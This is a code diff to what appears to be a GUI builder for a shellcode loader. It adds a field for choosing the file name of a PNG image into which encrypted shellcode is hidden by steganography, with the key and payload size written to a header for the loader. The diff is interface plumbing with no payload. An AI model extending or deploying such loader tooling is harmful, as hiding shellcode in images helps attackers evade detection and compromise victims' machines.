@@ -174,10 +174,14 @@ class MainWindow(QMainWindow):
         browse_sign_btn.clicked.connect(self.browse_sign_file)
         sign_file_layout.addWidget(self.sign_path)
         sign_file_layout.addWidget(browse_sign_btn)
-    
+    # 隐写设置
         steg_layout = QHBoxLayout()
         self.steg_check = QCheckBox("启用图片隐写")
-        steg_layout.addWidget(self.steg_check)  
+        self.steg_name = QLineEdit()  # 新增
+        self.steg_name.setFixedWidth(60)  # 设置固定宽度
+        self.steg_name.setText("1.png")   # 设置默认文件名
+        steg_layout.addWidget(self.steg_check)
+        steg_layout.addWidget(self.steg_name)  # 新增
         sign_layout.addLayout(steg_layout)
     
         # 输出文件选择
@@ -339,10 +343,9 @@ class MainWindow(QMainWindow):
             current_dir = os.path.dirname(os.path.abspath(__file__))
             
             if self.steg_check.isChecked():
-                # 1. 先写入key到header（key在加密过程中已经设置）
-                # 2. 隐写加密后的shellcode到图片
-                steg_output = os.path.splitext(self.output_path.text())[0] + '_steg.png' if self.output_path.text() \
-                    else os.path.join(current_dir, "..", "Loader", "shellcode_steg.png")
+                # 使用用户指定的文件名
+                steg_filename = self.steg_name.text() if self.steg_name.text() else "shellcode_steg.png"
+                steg_output = os.path.join(current_dir, "..", "Loader", steg_filename)
                 
                 # 写入key和shellcode大小到header
                 self.config_manager.save_to_header_placeholder(len(encrypted_data))
